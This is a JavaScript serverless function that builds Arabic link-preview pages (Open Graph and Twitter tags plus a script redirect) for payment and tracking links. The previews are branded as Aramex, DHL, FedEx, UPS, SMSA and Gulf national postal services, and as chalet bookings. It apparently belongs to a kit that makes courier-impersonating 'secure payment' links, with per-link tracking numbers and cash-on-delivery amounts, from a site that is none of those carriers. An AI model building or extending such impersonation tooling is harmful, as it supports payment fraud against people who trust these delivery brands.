// Service data mapping - matches the serviceLogos.ts file
const serviceData = {
  aramex: {
    name: "أرامكس - Aramex",
    description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة",
    ogImage: "/og-aramex.jpg"
  },
  dhl: {
    name: "دي إتش إل - DHL", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlkw: {
    name: "دي إتش إل - DHL الكويت", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlqa: {
    name: "دي إتش إل - DHL قطر", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlom: {
    name: "دي إتش إل - DHL عُمان", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlbh: {
    name: "دي إتش إل - DHL البحرين", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  fedex: {
    name: "فيديكس - FedEx",
    description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات", 
    ogImage: "/og-fedex.jpg"
  },
  ups: {
    name: "يو بي إس - UPS",
    description: "حلول لوجستية متكاملة وخدمات شحن سريعة حول العالم",
    ogImage: "/og-ups.jpg"
  },
  empost: {
    name: "البريد الإماراتي - Emirates Post",
    description: "المشغل الوطني للبريد في دولة الإمارات العربية المتحدة",
    ogImage: "/og-empost.jpg"
  },
  smsa: {
    name: "سمسا - SMSA",
    description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية",
    ogImage: "/og-smsa.jpg"
  },
  zajil: {
    name: "زاجل - Zajil",
    description: "شركة سعودية رائدة في خدمات البريد السريع والشحن",
    ogImage: "/og-zajil.jpg"
  },
  naqel: {
    name: "ناقل - Naqel", 
    description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة",
    ogImage: "/og-naqel.jpg"
  },
  saudipost: {
    name: "البريد السعودي - Saudi Post",
    description: "المشغل الوطني للبريد في المملكة العربية السعودية",
    ogImage: "/og-saudipost.jpg"
  },
  kwpost: {
    name: "البريد الكويتي - Kuwait Post",
    description: "المشغل الوطني للبريد في دولة الكويت",
    ogImage: "/og-kwpost.jpg"
  },
  qpost: {
    name: "البريد القطري - Qatar Post",
    description: "المشغل الوطني للبريد في دولة قطر",
    ogImage: "/og-qpost.jpg"
  },
  omanpost: {
    name: "البريد العُماني - Oman Post",
    description: "المشغل الوطني للبريد في سلطنة عُمان",
    ogImage: "/og-omanpost.jpg"
  },
  bahpost: {
    name: "البريد البحريني - Bahrain Post",
    description: "المشغل الوطني للبريد في مملكة البحرين",
    ogImage: "/og-bahpost.jpg"
  }
};

const stripNonAlphanumeric = (value = "") => value.replace(/[^a-z0-9]/gi, "");

const knownServiceKeys = Object.keys(serviceData);

const matchCondensedKey = (value = "") => {
  const condensedValue = stripNonAlphanumeric(value.toLowerCase());

  return knownServiceKeys.find((key) => {
    const condensedKey = stripNonAlphanumeric(key.toLowerCase());
    return condensedValue === condensedKey || condensedValue.includes(condensedKey);
  });
};

const normalizeServiceKey = (rawKey, fallbackName) => {
  if (rawKey) {
    const normalizedKey = rawKey.toString().trim().toLowerCase();

    if (knownServiceKeys.includes(normalizedKey)) {
      return normalizedKey;
    }

    const matchedKey = matchCondensedKey(normalizedKey);
    if (matchedKey) {
      return matchedKey;
    }
  }

  if (fallbackName) {
    const normalizedName = fallbackName.toString().trim().toLowerCase();
    const matchedKey = matchCondensedKey(normalizedName);

    if (matchedKey) {
      return matchedKey;
    }

    const englishSegment = fallbackName.toString().split("-").pop();
    if (englishSegment) {
      const matchedFromSegment = matchCondensedKey(englishSegment.trim().toLowerCase());
      if (matchedFromSegment) {
        return matchedFromSegment;
      }
    }
  }

  return "aramex";
};

const sanitizeText = (value, fallback = "", maxLength = 200) => {
  const normalize = (input = "") => input
    .toString()
    .replace(/[<>"\n\r\t]+/g, " ")
    .replace(/\s+/g, " ")
    .trim();

  const sanitizedFallback = normalize(fallback);

  if (!value) {
    return sanitizedFallback.slice(0, maxLength);
  }

  const sanitizedValue = normalize(value);

  if (!sanitizedValue) {
    return sanitizedFallback.slice(0, maxLength);
  }

  return sanitizedValue.slice(0, maxLength);
};

const escapeHtmlAttr = (value = "") => value
  .replace(/&/g, "&amp;")
  .replace(/"/g, "&quot;")
  .replace(/'/g, "&#39;")
  .replace(/</g, "&lt;")
  .replace(/>/g, "&gt;");

// Country data mapping
const countryData = {
  AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
  SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
  KW: { nameAr: "دولة الكويت", name: "Kuwait" },
  QA: { nameAr: "دولة قطر", name: "Qatar" },
  OM: { nameAr: "سلطنة عُمان", name: "Oman" },
  BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
};

// Supabase configuration
const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseKey = process.env.VITE_SUPABASE_ANON_KEY;

const supabase = supabaseUrl && supabaseKey ? createClient(supabaseUrl, supabaseKey) : null;

// Function to get link data from database
async function getLinkData(linkId) {
  if (!supabase) {
    console.log('Supabase not configured, using fallback data');
    return null;
  }
  
  try {
    const { data, error } = await supabase
      .from('links')
      .select('*')
      .eq('id', linkId)
      .single();
    
    if (error) {
      console.error('Error fetching link data:', error);
      return null;
    }
    
    return data;
  } catch (error) {
    console.error('Error in getLinkData:', error);
    return null;
  }
}

exports.handler = async (event, context) => {
  const { path, queryStringParameters } = event;
  
  // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
  let pathMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
  let countryCode, type, id;
  
  if (pathMatch) {
    [, countryCode, type, id] = pathMatch;
  } else {
    // Handle payment page routes: /pay/:id/...
    pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)\/(.+)$/);
    if (pathMatch) {
      [, id, subPath] = pathMatch;
      // For payment pages, we need to determine the type from the link data
      type = 'shipping'; // Default to shipping for payment pages
      countryCode = 'SA'; // Default country, will be overridden by link data
    } else {
      return {
        statusCode: 404,
        body: 'Not Found'
      };
    }
  }
  
  let country = countryData[countryCode];
  
  if (!country) {
    return {
      statusCode: 404,
      body: 'Country not found'
    };
  }
  
  // Try to get link data from database first
  const linkData = await getLinkData(id);
  
  // For payment pages, get country and type from link data if available
  if (linkData?.country_code) {
    countryCode = linkData.country_code;
    const linkCountry = countryData[countryCode];
    if (linkCountry) {
      country = linkCountry;
    }
  }
  
  if (linkData?.type) {
    type = linkData.type;
  }
  
  // Debug logging
  console.log('Link ID:', id);
  console.log('Link Data:', linkData);
  console.log('Query Parameters:', queryStringParameters);
  console.log('Final Country:', countryCode, 'Type:', type);
  
  let titleText = "";
  let descriptionText = "";
  let ogImagePath = "/og-aramex.jpg";
  let serviceKey = 'aramex';

  if (type === "shipping") {
    const rawServiceKeyCandidates = [
      linkData?.payload?.service_key,
      linkData?.payload?.service,
      queryStringParameters?.service,
    ];

    const serviceNameCandidate = linkData?.payload?.service_name;
    const primaryCandidate = rawServiceKeyCandidates.find(
      (candidate) => typeof candidate === "string" && candidate.trim().length > 0
    );

    serviceKey = normalizeServiceKey(primaryCandidate, serviceNameCandidate);
    console.log('Normalized service key:', serviceKey);

    const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
    const safeServiceName = sanitizeText(serviceNameCandidate, serviceInfo.name, 120);
    const serviceDescription = sanitizeText(serviceInfo.description, serviceData.aramex.description, 160);

    const isPaymentPage = path.startsWith('/pay/');
    const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';

    const descriptionSegments = [
      serviceDescription,
      isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'
    ];

    const trackingNumber = sanitizeText(linkData?.payload?.tracking_number, '', 60);
    if (trackingNumber) {
      descriptionSegments.push(`رقم الشحنة: ${trackingNumber}`);
    }

    const codAmount = Number(linkData?.payload?.cod_amount);
    if (Number.isFinite(codAmount) && codAmount > 0) {
      descriptionSegments.push(`مبلغ الدفع: ${codAmount} ر.س`);
    }

    titleText = `${pageType} - ${safeServiceName}`;
    descriptionText = descriptionSegments.filter(Boolean).join(' - ');
    ogImagePath = serviceInfo.ogImage || "/og-aramex.jpg";
  } else if (type === "chalet") {
    const chaletName = sanitizeText(linkData?.payload?.chalet_name, 'شاليه', 120);
    const isPaymentPage = path.startsWith('/pay/');
    const pageType = isPaymentPage ? 'دفع حجز شاليه' : 'حجز شاليه';
    const safeCountryName = sanitizeText(country?.nameAr, 'المملكة العربية السعودية', 120);

    titleText = `${pageType} - ${chaletName} في ${safeCountryName}`;

    const descriptionSegments = [
      `احجز ${chaletName} في ${safeCountryName}`,
      isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'
    ];

    const guestCount = Number(linkData?.payload?.guest_count);
    const nights = Number(linkData?.payload?.nights);

    if (Number.isFinite(guestCount) && Number.isFinite(nights) && guestCount > 0 && nights > 0) {
      descriptionSegments.push(`${guestCount} ضيف لـ ${nights} ليلة`);
    }

    descriptionText = descriptionSegments.filter(Boolean).join(' - ');
    ogImagePath = "/og-aramex.jpg";
  } else {
    titleText = 'نظام الدفع الآمن';
    descriptionText = sanitizeText(serviceData.aramex.description, 'نظام دفع آمن ومحمي', 200);
    ogImagePath = "/og-aramex.jpg";
  }

  const safeTitleText = sanitizeText(titleText, 'نظام الدفع الآمن', 140);
  const safeDescriptionText = sanitizeText(descriptionText, serviceData.aramex.description, 220);

  const siteUrl = `https://${event.headers.host}`;
  const fullUrl = `${siteUrl}${path}${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}`;
  const fullOgImage = ogImagePath && ogImagePath.startsWith('http') ? ogImagePath : `${siteUrl}${ogImagePath}`;

  const metaTitle = escapeHtmlAttr(safeTitleText);
  const metaDescription = escapeHtmlAttr(safeDescriptionText);
  const metaFullUrl = escapeHtmlAttr(fullUrl);
  const metaOgImage = escapeHtmlAttr(fullOgImage);
  const redirectUrlJson = JSON.stringify(fullUrl);

  // Final debug logging
  console.log('Final meta tags:', { title: safeTitleText, description: safeDescriptionText, ogImage: ogImagePath, serviceKey });
  
  // Generate HTML with proper meta tags
  const html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#0EA5E9" />
  
  <!-- Basic Meta Tags -->
  <title>${metaTitle}</title>
  <meta name="description" content="${metaDescription}" />
  <meta name="author" content="منصة الشحن الذكية" />
  
  <!-- Open Graph / Facebook / WhatsApp -->
  <meta property="og:type" content="website" />
  <meta property="og:url" content="${metaFullUrl}" />
  <meta property="og:title" content="${metaTitle}" />
  <meta property="og:description" content="${metaDescription}" />
  <meta property="og:image" content="${metaOgImage}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:site_name" content="نظام الدفع الآمن" />
  <meta property="og:locale" content="ar_AR" />
  
  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:url" content="${metaFullUrl}" />
  <meta name="twitter:title" content="${metaTitle}" />
  <meta name="twitter:description" content="${metaDescription}" />
  <meta name="twitter:image" content="${metaOgImage}" />
  <meta name="twitter:image:alt" content="${metaTitle}" />
  
  <!-- Additional SEO -->
  <meta name="robots" content="index, follow" />
  <meta name="language" content="Arabic" />
  <link rel="canonical" href="${metaFullUrl}" />
  
  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
  
  <style>
    body {
      font-family: 'Almarai', sans-serif;
      margin: 0;
      padding: 2rem;
      background: #0EA5E9;
      color: white;
    }
    .meta-info {
      max-width: 680px;
      margin: 0 auto;
    }
    .meta-info h1 {
      font-size: 1.75rem;
      margin-bottom: 1rem;
    }
    .meta-info p {
      font-size: 1rem;
      line-height: 1.6;
      opacity: 0.9;
    }
  </style>
</head>
<body>
  <div class="meta-info">
    <h1>${metaTitle}</h1>
    <p>${metaDescription}</p>
  </div>
  <script>
    window.location.replace(${redirectUrlJson});
  </script>
</body>
</html>`;

  return {
    statusCode: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
      'X-Robots-Tag': 'noindex, nofollow'
    },
    body: html
  };
};